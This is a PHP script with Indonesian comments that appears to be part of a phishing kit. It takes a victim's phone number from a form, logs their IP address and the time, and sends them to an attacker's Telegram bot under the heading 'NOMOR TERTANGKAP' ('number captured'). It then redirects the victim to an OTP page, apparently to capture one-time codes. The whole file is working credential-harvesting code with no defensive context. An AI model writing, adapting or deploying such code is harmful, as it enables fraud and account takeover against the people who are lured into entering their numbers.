<?php
// Bersihkan buffer agar header tidak error
if (ob_get_level()) ob_end_clean();
ob_start();

// Izinkan semua method dan CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

session_start();
include 'config.php';

// Ambil data dari POST atau GET (fallback)
$phone = $_POST['phone'] ?? $_GET['phone'] ?? null;

if (!$phone) {
    http_response_code(400);
    echo json_encode(['error' => 'Nomor HP tidak diberikan']);
    exit;
}

// Validasi dasar
$phone = trim($phone);
if (strlen($phone) < 8) {
    http_response_code(400);
    echo json_encode(['error' => 'Nomor HP tidak valid']);
    exit;
}

$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$time = date('Y-m-d H:i:s');

// Simpan di session
$_SESSION['phone'] = $phone;

// Kirim notifikasi ke Telegram
$message = "📱 NOMOR TERTANGKAP\n";
$message .= "Nomor: $phone\n";
$message .= "IP: $ip\n";
$message .= "Waktu: $time";

// Gunakan curl jika file_get_contents diblokir
if (function_exists('curl_version')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
} else {
    @file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
}

// Redirect ke halaman OTP
header("Location: otp.php");
exit;
?>
